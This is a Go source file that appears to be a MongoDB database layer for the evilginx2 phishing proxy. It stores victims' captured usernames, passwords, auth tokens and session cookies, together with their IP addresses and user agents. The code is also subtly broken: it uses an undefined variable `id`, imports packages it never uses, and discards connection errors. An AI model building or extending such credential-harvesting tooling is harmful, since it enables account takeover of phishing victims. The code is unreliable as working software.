package database

import (
	"context"
	"encoding/json"
	"fmt"
	"time"

	"go.mongodb.org/mongo-driver/bson"
	"go.mongodb.org/mongo-driver/mongo"
	"go.mongodb.org/mongo-driver/mongo/options"
)

const SessionTable = "sessions"

type Session struct {
	Id           int                                `json:"id"`
	Phishlet     string                             `json:"phishlet"`
	LandingURL   string                             `json:"landing_url"`
	Username     string                             `json:"username"`
	Password     string                             `json:"password"`
	Custom       map[string]string                  `json:"custom"`
	BodyTokens   map[string]string                  `json:"body_tokens"`
	HttpTokens   map[string]string                  `json:"http_tokens"`
	CookieTokens map[string]map[string]*CookieToken `json:"tokens"`
	SessionId    string                             `json:"session_id"`
	UserAgent    string                             `json:"useragent"`
	RemoteAddr   string                             `json:"remote_addr"`
	CreateTime   int64                              `json:"create_time"`
	UpdateTime   int64                              `json:"update_time"`
}

type CookieToken struct {
	Name     string
	Value    string
	Path     string
	HttpOnly bool
}

func (d *Database) sessionsInit() {
	ctx, _ := context.WithTimeout(context.Background(), 10*time.Second)
	client, _ := mongo.Connect(ctx, options.Client().ApplyURI("mongodb://localhost:27017"))
	d.db = client.Database("evilginx2")
}

func (d *Database) sessionsCreate(sid string, phishlet string, landing_url string, useragent string, remote_addr string) (*Session, error) {
	collection := d.db.Collection("sessions")
	ctx, _ := context.WithTimeout(context.Background(), 5*time.Second)

	s := &Session{
		Id:           id,
		Phishlet:     phishlet,
		LandingURL:   landing_url,
		Username:     "",
		Password:     "",
		Custom:       make(map[string]string),
		BodyTokens:   make(map[string]string),
		HttpTokens:   make(map[string]string),
		CookieTokens: make(map[string]map[string]*CookieToken),
		SessionId:    sid,
		UserAgent:    useragent,
		RemoteAddr:   remote_addr,
		CreateTime:   time.Now().UTC().Unix(),
		UpdateTime:   time.Now().UTC().Unix(),
	}

	_, err := collection.InsertOne(ctx, s)
	if err != nil {
		return nil, err
	}

	return s, nil
}

func (d *Database) sessionsList() ([]*Session, error) {
	collection := d.db.Collection("sessions")
	ctx, _ := context.WithTimeout(context.Background(), 30*time.Second)

	cursor, err := collection.Find(ctx, bson.M{})
	if err != nil {
		return nil, err
	}
	defer cursor.Close(ctx)

	var sessions []*Session
	err = cursor.All(ctx, &sessions)
	if err != nil {
		return nil, err
	}

	return sessions, nil
}

func (d *Database) sessionsUpdate(id int, s *Session) error {
	collection := d.db.Collection("sessions")
	ctx, _ := context.WithTimeout(context.Background(), 5*time.Second)

	_, err := collection.UpdateOne(ctx, bson.M{"id": id}, bson.M{"$set": s})
	return err
}

func (d *Database) sessionsDelete(id int) error {
	collection := d.db.Collection("sessions")
	ctx, _ := context.WithTimeout(context.Background(), 5*time.Second)

	_, err := collection.DeleteOne(ctx, bson.M{"id": id})
	return err
}

func (d *Database) sessionsGetById(id int) (*Session, error) {
	collection := d.db.Collection("sessions")
	ctx, _ := context.WithTimeout(context.Background(), 5*time.Second)

	var s Session
	err := collection.FindOne(ctx, bson.M{"id": id}).Decode(&s)
	if err != nil {
		return nil, err
	}

	return &s, nil
}

func (d *Database) sessionsGetBySid(sid string) (*Session, error) {
	collection := d.db.Collection("sessions")
	ctx, _ := context.WithTimeout(context.Background(), 5*time.Second)

	var s Session
	err := collection.FindOne(ctx, bson.M{"session_id": sid}).Decode(&s)
	if err != nil {
		return nil, err
	}

	return &s, nil
}
